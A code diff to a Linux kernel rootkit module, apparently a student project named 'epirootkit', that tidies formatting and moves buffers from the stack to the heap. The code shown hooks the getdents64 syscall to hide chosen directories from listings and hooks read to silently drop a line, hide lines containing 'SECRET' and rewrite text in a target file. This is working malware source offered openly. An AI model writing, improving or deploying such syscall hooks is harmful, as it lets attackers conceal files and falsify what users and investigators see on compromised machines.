@@ -1,8 +1,8 @@
+#include <linux/file.h>
 #include <linux/fs.h>
 #include <linux/list.h>
 #include <linux/spinlock.h>
 #include <linux/string.h>
-#include <linux/file.h>
 
 #include "epirootkit.h"
 
@@ -57,8 +57,7 @@ int add_hidden_dir(const char *dirname) {
 
     // Maybe need to improve this part...
     bool is_path = dirname[0] == '/';
-    if (!is_path)
-    {
+    if (!is_path) {
         ERR_MSG("hooks: please provide a valid full‑path entry.\n");
         return -EINVAL;
     }
@@ -156,7 +155,7 @@ asmlinkage int getdents64_hook(const struct pt_regs *regs) {
     int fd = (int)regs->di;
     struct file *dir_f;
     struct path parent_path;
-    char dirbuf[512];
+    char *dirbuf = kmalloc(512, GFP_KERNEL);
     char *dirstr = NULL;
 
     dir_f = fget(fd);
@@ -218,10 +217,11 @@ asmlinkage int getdents64_hook(const struct pt_regs *regs) {
         if (dirstr) {
             char fullpath[1024];
             int len;
-            
+
             if (strcmp(dirstr, "/") == 0) {
                 len = snprintf(fullpath, sizeof(fullpath), "/%s", d->d_name);
-            } else {
+            }
+            else {
                 len = snprintf(fullpath, sizeof(fullpath), "%s/%s", dirstr, d->d_name);
             }
 
@@ -247,45 +247,51 @@ asmlinkage int getdents64_hook(const struct pt_regs *regs) {
 
     kfree(kbuf);
     kfree(newbuf);
+    kfree(dirbuf);
 
     // New size without directories we do not want...
     return new_size;
 }
 
-#define FILTER_FILE      "/test.txt"
+#define FILTER_FILE "/test.txt"
 #define HIDE_LINE_NUMBER 3
-#define HIDE_SUBSTRING   "SECRET"
-#define REPLACE_SRC      "efrei"
-#define REPLACE_DST      "epita"
+#define HIDE_SUBSTRING "SECRET"
+#define REPLACE_SRC "efrei"
+#define REPLACE_DST "epita"
 
 static asmlinkage long (*__orig_read)(const struct pt_regs *regs);
 static asmlinkage long read_hook(const struct pt_regs *regs);
 
-static bool is_target_file(int fd)
-{
+static bool is_target_file(int fd) {
     struct file *f;
     struct path path;
     char *tmp;
-    bool tinder_match = false;
-    char buf[1024];
+    bool match = false;
+    char *buf = kmalloc(1024, GFP_KERNEL); // 🧠 Heap instead of stack
+
+    if (!buf)
+        return false;
 
     f = fget(fd);
-    if (!f)
+    if (!f) {
+        kfree(buf);
         return false;
+    }
 
     path = f->f_path;
     path_get(&path);
-    tmp = d_path(&path, buf, sizeof(buf));
+
+    tmp = d_path(&path, buf, 1024);
     if (!IS_ERR(tmp) && strcmp(tmp, FILTER_FILE) == 0)
-        tinder_match = true;
+        match = true;
 
     path_put(&path);
     fput(f);
-    return tinder_match;
+    kfree(buf);
+    return match;
 }
 
-asmlinkage long read_hook(const struct pt_regs *regs)
-{
+asmlinkage long read_hook(const struct pt_regs *regs) {
     // Call the original read syscall first
     long ret = __orig_read(regs);
     if (ret <= 0)
@@ -297,8 +303,9 @@ asmlinkage long read_hook(const struct pt_regs *regs)
         return ret;
 
     // Copy user buffer to kernel
-    char *kbuf = kmalloc(ret+1, GFP_KERNEL);
-    if (!kbuf) return ret;
+    char *kbuf = kmalloc(ret + 1, GFP_KERNEL);
+    if (!kbuf)
+        return ret;
     if (copy_from_user(kbuf, (char __user *)regs->si, ret)) {
         kfree(kbuf);
         return ret;
@@ -310,7 +317,7 @@ asmlinkage long read_hook(const struct pt_regs *regs)
 
     // Prepare output buffer (we double the output just in case replacement string is longer)
     // Maybe not the best solution... to improve later
-    char *out = kmalloc(ret*2 + 1, GFP_KERNEL);
+    char *out = kmalloc(ret * 2 + 1, GFP_KERNEL);
     if (!out) {
         kfree(kbuf);
         return ret;
@@ -338,7 +345,6 @@ asmlinkage long read_hook(const struct pt_regs *regs)
         if (!skip) {
             char *seg = line;
             while ((p = strstr(seg, REPLACE_SRC))) {
-
                 // Copy up to matching string
                 size_t distance_before = p - seg;
                 memcpy(out + out_len, seg, distance_before);
@@ -366,8 +372,10 @@ asmlinkage long read_hook(const struct pt_regs *regs)
     out[out_len] = '\0';
 
     // Copy filtered data back to user
-    if (copy_to_user((char __user *)regs->si, out, out_len)) ret = ret;
-    else ret = out_len;
+    if (copy_to_user((char __user *)regs->si, out, out_len))
+        ret = ret;
+    else
+        ret = out_len;
 
     kfree(out);
     kfree(kbuf);
